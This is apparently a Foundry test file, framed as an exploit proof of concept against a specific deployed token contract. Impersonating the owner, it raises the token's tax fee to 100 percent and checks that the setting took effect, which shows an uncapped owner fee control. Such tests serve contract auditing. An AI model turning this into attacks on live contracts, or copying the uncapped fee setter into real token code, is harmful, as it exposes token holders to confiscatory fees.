// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IONE1SHIBA {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256 taxFee) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);
    IONE1SHIBA target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IONE1SHIBA(TARGET);
        owner = target.owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        target.setTaxFeePercent(100);
        vm.stopPrank();

        (bool success, bytes memory data) = TARGET.call(abi.encodeWithSignature("_taxFee()"));
        require(success, "Low-level call failed");
        uint256 taxFee = abi.decode(data, (uint256));

        assertGt(taxFee, 25, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

